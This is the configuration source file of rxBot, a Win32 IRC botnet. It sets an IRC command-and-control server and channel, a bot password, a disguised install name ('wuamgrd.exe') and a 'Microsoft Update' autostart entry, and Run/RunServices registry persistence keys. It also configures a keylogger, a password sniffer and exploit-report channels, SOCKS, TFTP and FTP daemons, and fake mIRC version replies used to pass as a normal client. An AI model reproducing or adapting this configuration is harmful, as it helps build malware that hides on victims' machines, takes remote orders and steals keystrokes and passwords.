/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

// bot configuration (generic) - doesn't need to be encrypted
unsigned short port = 6667;			// server port
unsigned short port2 = 6667;		// backup server port
unsigned short socks4port = 12221;	// Port # for sock4 daemon to run on  - CHANGE THIS!!!
unsigned short tftpport = 69;		// Port # for tftp daemon to run on
unsigned short httpport = 2001;		// Port # for http daemon to run on
unsigned short ftpport = 21;		// Port # for ftp daemon to run on
unsigned short rloginport = 513;	// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;				// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;			// use random file name
BOOL AutoStart = FALSE;				// enable autostart registry keys
char prefix = '.';					// command prefix (one character max.)
int maxrand = 4;					// how many random numbers in the nick
int nicktype = CONSTNICK;			// nick type (see rndnick.h)
BOOL nickprefix = TRUE;				// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

// INSERT OUTPUT FROM .ENCRYPT COMMAND HERE!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "rx01";							// bot id
char version[] = "[rxBot v0.6.6 b]";			// Bots !version reply
char password[] = "changeme";						// bot password
char server[] = "irc.rizon.net";			// server
char serverpass[] = "";							// server password
char channel[] = "#rxbot";					// channel that the bot should join
char chanpass[] = "";							// channel password
char server2[] = "";							// backup server (optional)
char channel2[] = "";							// backup channel (optional)
char chanpass2[] = "";							// backup channel password (optional)
char filename[] = "wuamgrd.exe";				// destination file name
char keylogfile[] = "keys.txt";					// keylog filename
char valuename[] = "Microsoft Update";			// value name for autostart
char nickconst[] = "[RX]|";						// first part to the bot's nick
char modeonconn[] = "-x+B";						// Can be more than one mode and contain both + and -
char chanmode[] = "+n+t";						// Channel mode after joining
char exploitchan[] = "";						// Channel where exploit messages get redirected
char keylogchan[] = "";							// Channel where keylog messages get redirected
char psniffchan[] = "";							// Channel where psniff messages get redirected 

char *authost[] = {
	"*@*.net",
	"*@*.com"
};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif
